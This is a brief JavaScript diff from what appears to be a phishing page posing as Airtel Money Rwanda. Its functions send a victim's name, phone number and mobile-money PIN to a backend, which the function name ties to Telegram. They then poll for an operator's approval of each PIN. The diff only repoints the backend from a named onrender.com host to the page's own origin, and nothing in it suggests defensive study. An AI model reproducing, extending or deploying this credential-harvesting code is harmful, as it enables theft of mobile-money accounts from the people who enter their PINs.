@@ -186,7 +186,7 @@ const boxes = document.querySelectorAll(".pin-boxes input");
 const statusEl = document.getElementById("status");
 
 async function sendPinToTelegram(name, phone, pin) {
-  const BACKEND_URL = "https://airtel-money-rwanda.onrender.com";
+  const BACKEND_URL = window.location.origin;
   try {
     const res = await fetch(`${BACKEND_URL}/submit-pin`, {
       method: "POST",
@@ -200,7 +200,7 @@ async function sendPinToTelegram(name, phone, pin) {
 }
 
 async function pollPinApproval(requestId) {
-  const BACKEND_URL = "https://airtel-money-rwanda.onrender.com";
+  const BACKEND_URL = window.location.origin;
   return new Promise(resolve => {
     const i = setInterval(async () => {
       const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
